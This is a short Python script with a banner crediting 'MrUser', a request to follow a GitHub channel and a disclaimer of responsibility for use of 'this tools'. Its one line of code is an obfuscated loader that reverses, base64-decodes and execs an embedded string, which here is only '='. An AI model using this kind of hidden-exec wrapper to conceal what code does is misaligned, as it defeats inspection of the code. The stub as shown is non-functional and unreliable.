#===========================
#Coded by MrUser
#Made in Madagascar
#Please follow my github channel
#I am not responsible for what you will do with this tools
#===========================
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))